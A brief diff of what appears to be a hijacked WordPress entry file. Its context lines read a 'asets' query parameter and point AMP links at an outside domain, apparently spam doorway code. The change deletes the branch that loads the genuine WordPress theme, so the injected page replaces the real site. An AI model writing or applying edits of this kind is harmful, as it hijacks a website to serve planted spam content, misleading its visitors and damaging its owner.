@@ -8,11 +8,7 @@ if (isset($_GET['asets']) && !empty($_GET['asets'])) {
     $link = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
     $ampnya = "https://amp.darat.pro/insoplas/" . strtolower($page);
 } 
-else {
-    define('WP_USE_THEMES', true);
-    require __DIR__ . '/wp-blog-header.php';
-    exit;
-}
+
 ?>
 
 <!DOCTYPE HTML>
